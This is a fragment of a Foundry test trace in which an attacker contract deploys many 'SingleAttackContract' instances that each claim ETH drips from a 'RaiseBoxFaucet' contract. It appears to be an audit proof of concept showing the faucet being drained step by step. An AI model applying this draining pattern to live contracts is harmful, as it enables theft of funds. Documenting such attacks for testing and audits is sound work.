    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 595000000000000000 [5.95e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x23D91ad582633f658F5d69a7b1054C1488CBeeFD
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 81) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1452834] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1452075] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1415907] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1408249] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 590000000000000000 [5.9e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xDcF5760E454010e04eE445233E9D2b398ad8bD83
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 82) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1150865] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1150106] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1113938] SingleAttackContract::receive{value: 5000000000000000}()
